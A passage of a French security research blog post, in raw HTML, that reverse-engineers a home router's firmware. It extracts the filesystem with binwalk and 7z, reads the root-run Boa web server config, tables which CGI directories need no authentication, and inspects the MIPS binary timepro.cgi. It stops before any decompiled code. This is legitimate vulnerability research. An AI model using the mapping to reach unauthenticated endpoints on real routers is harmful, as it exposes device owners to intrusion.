&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">46692&lt;/span> 0xB664 LZMA compressed data, properties: 0x5D, dictionary size: &lt;span class="m">16777216&lt;/span> bytes, compressed size: &lt;span class="m">74712&lt;/span> bytes, uncompressed size: &lt;span class="m">208352&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">131072&lt;/span> 0x20000 TRX firmware image, version 1, partition count: 2, header size: &lt;span class="m">28&lt;/span> bytes, total size: &lt;span class="m">3149824&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extraction of lzma data at offset 0xB664 completed successfully
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extraction of trx data at offset 0x20000 completed successfully
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Analyzed &lt;span class="m">1&lt;/span> file &lt;span class="k">for&lt;/span> &lt;span class="m">110&lt;/span> file signatures &lt;span class="o">(&lt;/span>&lt;span class="m">249&lt;/span> magic patterns&lt;span class="o">)&lt;/span> in 45.0 milliseconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;em>Binwalk&lt;/em> a donc identifié et extrait &lt;em>(grâce à l&amp;rsquo;utilisation du paramètre -e/&amp;ndash;extract)&lt;/em> deux blocs avec une signature connue :&lt;/p>
&lt;ol>
&lt;li>&lt;strong>Offset 0XB664 :&lt;/strong> une archive compréssée avec &lt;a
class="gblog-markdown__link"
href="https://fr.wikipedia.org/wiki/LZMA"
>LZMA&lt;/a>&lt;/li>
&lt;li>&lt;strong>Offset 0x20000 :&lt;/strong> un conteneur &lt;a
class="gblog-markdown__link"
href="https://openwrt.org/docs/techref/headers"
>TRX&lt;/a> censé contenir différentes partitions telles que celle du noyau ou encore du système de fichiers&lt;/li>
&lt;/ol>
&lt;p>Pour des raisons qu&amp;rsquo;on verra par la suite, on va se concentrer sur ce deuxième bloc &lt;em>TRX&lt;/em> qui suit la structure suivante :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-txt" data-lang="txt">&lt;span class="line">&lt;span class="cl"> 0 1 2 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------------------------------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | magic number (&amp;#39;HDR0&amp;#39;) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------------------------------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | length (header size + data) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------+---------------+-------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | 32-bit CRC value |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------+---------------+-------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | TRX flags | TRX version |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +-------------------------------+-------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | Partition offset[0] |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------------------------------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | Partition offset[1] |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------------------------------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | Partition offset[2] |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------------------------------------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> // Source : openwrt/tools/firmware-utils/src/trx.c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file extractions/firmware.bin.extracted/20000/*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">extractions/firmware.bin.extracted/20000/partition_0.bin: LZMA compressed data, non-streamed, size &lt;span class="m">4276224&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">extractions/firmware.bin.extracted/20000/partition_1.bin: Linux Compressed ROM File System data, little endian size &lt;span class="m">1740800&lt;/span> version &lt;span class="c1">#2 sorted_dirs CRC 0xe66d68a8, edition 0, 1334 blocks, 247 files&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>On peut voir que &lt;em>Binwalk&lt;/em> a identifié et extrait deux partitions dans le conteneur &lt;em>TRX&lt;/em> :&lt;/p>
&lt;ol>
&lt;li>&lt;strong>partition_0.bin :&lt;/strong> une autre archive compressée en &lt;em>LZMA&lt;/em>&lt;/li>
&lt;li>&lt;strong>partition_1.bin :&lt;/strong> un système de fichiers du type &lt;a
class="gblog-markdown__link"
href="https://fr.wikipedia.org/wiki/Cramfs"
>CRAMFS (Compressed ROM/RAM File System)&lt;/a>&lt;/li>
&lt;/ol>
&lt;p>Encore une fois concentrons nous sur &lt;em>partition_1.bin&lt;/em> qui contient le système de fichiers. Pour extraire son contenu, il est possible d&amp;rsquo;utiliser &lt;a
class="gblog-markdown__link"
href="https://7-zip.org/"
>7z&lt;/a> qui supporte le format &lt;em>CRAMFS&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ 7z x extractions/firmware.bin.extracted/20000/partition_1.bin -o/tmp/firm_fs/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">7-Zip &lt;span class="o">[&lt;/span>64&lt;span class="o">]&lt;/span> 16.02 : Copyright &lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> 1999-2016 Igor Pavlov : 2016-05-21
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">p7zip Version 16.02 &lt;span class="o">(&lt;/span>&lt;span class="nv">locale&lt;/span>&lt;span class="o">=&lt;/span>en_US.UTF-8,Utf16&lt;span class="o">=&lt;/span>on,HugeFiles&lt;span class="o">=&lt;/span>on,64 bits,12 CPUs Intel&lt;span class="o">(&lt;/span>R&lt;span class="o">)&lt;/span> Core&lt;span class="o">(&lt;/span>TM&lt;span class="o">)&lt;/span> i7-10750H CPU @ 2.60GHz &lt;span class="o">(&lt;/span>A0652&lt;span class="o">)&lt;/span>,ASM,AES-NI&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Scanning the drive &lt;span class="k">for&lt;/span> archives:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> file, &lt;span class="m">1742824&lt;/span> bytes &lt;span class="o">(&lt;/span>&lt;span class="m">1702&lt;/span> KiB&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Extracting archive: extractions/firmware.bin.extracted/20000/partition_1.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WARNINGS:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">There are data after the end of archive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Path&lt;/span> &lt;span class="o">=&lt;/span> extractions/firmware.bin.extracted/20000/partition_1.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Type&lt;/span> &lt;span class="o">=&lt;/span> CramFS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WARNINGS:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">There are data after the end of archive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Physical &lt;span class="nv">Size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">1740800&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tail &lt;span class="nv">Size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">2024&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Label&lt;/span> &lt;span class="o">=&lt;/span> Compressed
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Big-endian &lt;span class="o">=&lt;/span> -
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Characteristics&lt;/span> &lt;span class="o">=&lt;/span> Ver2 SortedDirs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cluster &lt;span class="nv">Size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">4096&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Method&lt;/span> &lt;span class="o">=&lt;/span> ZLIB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Headers &lt;span class="nv">Size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">5668&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Files&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">247&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Blocks&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">1334&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Everything is Ok
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Archives with Warnings: &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warnings: &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Folders: &lt;span class="m">32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Files: &lt;span class="m">214&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Size: &lt;span class="m">5031151&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Compressed: &lt;span class="m">1742824&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ ls -la /tmp/firm_fs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">total &lt;span class="m">112&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">15&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:51 .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxrwxrwt &lt;span class="m">41&lt;/span> root root &lt;span class="m">40960&lt;/span> mai &lt;span class="m">10&lt;/span> 21:51 ..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">3&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 cramfs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">4&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 default
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-rw-r-- &lt;span class="m">1&lt;/span> skander skander &lt;span class="m">8&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 etc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">3&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 home
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">3&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 lib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-rw-r-- &lt;span class="m">1&lt;/span> skander skander &lt;span class="m">11&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 linuxrc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 ndbin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 plugin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 proc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 save
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 sbin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 tmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">4&lt;/span> skander skander &lt;span class="m">4096&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 usr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-rw-r-- &lt;span class="m">1&lt;/span> skander skander &lt;span class="m">8&lt;/span> mai &lt;span class="m">10&lt;/span> 21:11 var
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;blockquote class="gblog-hint note">
&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
&lt;div class="gblog-hint__text">&lt;em>Binwalk&lt;/em> offre d&amp;rsquo;autres paramètres intéressants dont &amp;ldquo;-M/&amp;ndash;matryoshka&amp;rdquo; qui permet de réaliser une analyse récursive.&lt;/div>
&lt;/blockquote>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="mapping-du-code-source"
>
Mapping du code source
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#mapping-du-code-source" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Mapping du code source" href="#mapping-du-code-source">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Maintenant que nous avons un accès à l&amp;rsquo;ensemble des éléments présents dans le système de fichiers, il est nécessaire d&amp;rsquo;identifier les fichiers contenant le code applicatif du routeur. Pour cela, le fichier de configuration du serveur web peut être un bon début :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ cat default/var/boa_vh.conf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Port &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Group root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ServerAdmin root@localhost
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VirtualHost
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DocumentRoot /home/httpd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">UserDir public_html
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DirectoryIndex index.html
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">KeepAliveMax &lt;span class="m">100&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">KeepAliveTimeout &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MimeTypes /etc/mime.types
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DefaultType text/plain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">AddType application/x-httpd-cgi cgi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">AddType text/html html
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ScriptAlias /cgi-bin/ /bin/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ScriptAlias /testbin/ /tmp/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ScriptAlias /nd-bin/ /ndbin/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ScriptAlias /login/ /bin/login/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ScriptAlias /ddns/ /bin/ddns/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ServerName &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SinglePostLimit &lt;span class="m">4194304&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Auth /cgi-bin /etc/httpd.passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Auth /main /etc/httpd.passwd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>On peut en déduire plusieurs informations intéressantes telles que :&lt;/p>
&lt;ul>
&lt;li>Le serveur est &lt;strong>exécuté avec les droits root&lt;/strong>&lt;/li>
&lt;li>La racine du serveur se situe dans &lt;strong>/home/httpd&lt;/strong>&lt;/li>
&lt;li>Il y&amp;rsquo;a &lt;strong>plusieurs répertoires qui sont exposés&lt;/strong>, donnant la possibilité d&amp;rsquo;exécuter les programmes &lt;a
class="gblog-markdown__link"
href="https://fr.wikipedia.org/wiki/Common_Gateway_Interface"
>CGI&lt;/a> qui y sont présents &lt;em>(de manière non authentifiée pour certains)&lt;/em>&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Chemin Système&lt;/th>
&lt;th>Chemin HTTP&lt;/th>
&lt;th>Besoin d&amp;rsquo;authentification&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>/bin/&lt;/td>
&lt;td>/cgi-bin/&lt;/td>
&lt;td>OUI&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/bin/login/&lt;/td>
&lt;td>/login/&lt;/td>
&lt;td>NON&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/bin/ddns/&lt;/td>
&lt;td>/ddns/&lt;/td>
&lt;td>NON&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/ndbin/&lt;/td>
&lt;td>/nd-bin/&lt;/td>
&lt;td>NON&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/tmp/&lt;/td>
&lt;td>/testbin/&lt;/td>
&lt;td>NON&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/home/httpd/main&lt;/td>
&lt;td>/main/&lt;/td>
&lt;td>OUI&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Maintenant que nous avons une vue globale sur le mapping réalisé par le serveur HTTP, on peut commencer à inspecter le contenu des différents répertoires exposés.&lt;/p>
&lt;blockquote class="gblog-hint note">
&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
&lt;div class="gblog-hint__text">&lt;strong>Rappel :&lt;/strong> à la différence de &lt;a
class="gblog-markdown__link"
href="https://httpd.apache.org/docs/2.4/fr/mod/mod_alias.html#alias"
>Alias&lt;/a>, la directive &lt;a
class="gblog-markdown__link"
href="https://httpd.apache.org/docs/2.4/fr/mod/mod_alias.html#scriptalias"
>ScriptAlias&lt;/a> permet de spécifier un répertoire cible contenant des scripts CGI allant être traîtées par le gestionnaire &lt;em>cgi-script&lt;/em>. Il n&amp;rsquo;est donc pas possible d&amp;rsquo;exécuter ou lire un autre type de fichier et c&amp;rsquo;est pour cela qu&amp;rsquo;on va se concentrer uniquement sur ce format durant l&amp;rsquo;analyse des différents répertoires.&lt;/div>
&lt;/blockquote>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="un-air-de-déjà-vu"
>
Un air de déjà vu
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#un-air-de-déjà-vu" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Un air de déjà vu" href="#un-air-de-d%c3%a9j%c3%a0-vu">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Si on reprend l&amp;rsquo;ordre du précédent tableau, on peut commencer par analyser le contenu du répertoire &lt;em>/bin&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file bin/*.cgi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/d.cgi: ASCII text, with no line terminators
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/timepro.cgi: ELF 32-bit LSB executable, MIPS, MIPS-I version &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>SYSV&lt;span class="o">)&lt;/span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/upgrade.cgi: ELF 32-bit LSB executable, MIPS, MIPS-I version &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>SYSV&lt;span class="o">)&lt;/span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/wps_wizard.cgi: ELF 32-bit LSB executable, MIPS, MIPS-I version &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>SYSV&lt;span class="o">)&lt;/span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Procédons encore une fois par ordre. Une simple &lt;em>cat&lt;/em> sur &lt;em>d.cgi&lt;/em> &lt;em>(sachant que c&amp;rsquo;est un fichier comportant uniquement du text)&lt;/em> nous revèle qu&amp;rsquo;il pointe vers &lt;em>timepro.cgi&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ cat bin/d.cgi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/timepro.cgi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Vient le tour de &lt;em>timepro.cgi&lt;/em> qui en passant est le script observé durant l&amp;rsquo;utilisation de l&amp;rsquo;espace d&amp;rsquo;administration du routeur. On peut partir sur l&amp;rsquo;hypothèse que c&amp;rsquo;est le script principal pour la partie web. Son analyse est donc essentielle pour cette recherche.&lt;/p>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/web-portal-timepro.png" />&lt;figcaption style="text-align: center;">/cgi-bin/timepro.cgi&lt;/figcaption>&lt;/figure>
&lt;p>Une fois l&amp;rsquo;architecture bien confirmée avec &lt;a
class="gblog-markdown__link"
href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/"
>rabin2&lt;/a>, on peut passer le binaire à un désassembleur/décompilateur.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ rabin2 -I bin/timepro.cgi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">r2pm -ci r2ghidra
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">arch mips
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cpu mips1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">baddr 0x400000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">binsz &lt;span class="m">661584&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">bintype elf
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">bits &lt;span class="m">32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">canary &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">injprot &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">class ELF32
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flags 0x5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">abi o32
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">crypto &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">endian little
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">havecode &lt;span class="nb">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">intrp /lib/ld-uClibc.so.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">laddr 0x0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lang c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">linenum &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lsyms &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">machine MIPS R3000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nx &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">os linux
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pic &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">relocs &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">relro no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rpath NONE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sanitize &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">static &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stripped &lt;span class="nb">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">subsys linux
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">va &lt;span class="nb">true&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="analyse-du-fichier"
>
Analyse du fichier
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#analyse-du-fichier" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Analyse du fichier" href="#analyse-du-fichier">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Le binaire importé dans &lt;a
class="gblog-markdown__link"
href="https://ghidra-sre.org/"
>Ghidra&lt;/a>, commençons par le plus simple et qui est d&amp;rsquo;analyser la fonction &lt;em>main&lt;/em>. Ci-dessous une partie du pseudo-code obtenu après décompilation :&lt;/p>
